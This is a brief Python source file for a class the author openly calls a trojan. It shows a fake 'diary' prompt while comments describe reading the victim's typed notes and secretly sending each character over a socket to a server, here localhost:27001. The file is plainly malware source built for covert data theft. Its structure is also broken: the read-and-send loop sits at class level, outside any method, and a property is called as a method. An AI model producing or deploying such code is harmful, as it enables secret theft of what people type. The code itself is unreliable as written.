""" implementation of the trojan that is used to collect data and sends them to server 
    it acts like a temporary diary 
"""

import logging
import socket
import sys 

class Trojan:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    @property
    def host(self):
        return self._host
    @host.setter
    def host(self, new_host):
        self._host = new_host
    
    @property
    def port(self):
        return self._port

    @port.setter
    def port(self, new_port):
        self._port = new_port

    @property
    def collect_data(self):
        # secretly collect data from the victim and send them to server 
        try:
            self._socket.connect((self._host, self._port))
        except socket.error as e:
            logging.debug(f"Trogan could not connect to server {e}")
            return 
        
    print("Hello, this is your diary. You can type here for notes: ")

    # read notes writting by victim and send them to server
    while True:
        character = sys.stdin.read(1)
        self._socket.send(bytes(character, 'utf-8'))


if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)

    trojan = Trojan("localhost", 27001)
    trojan.collect_data()





    



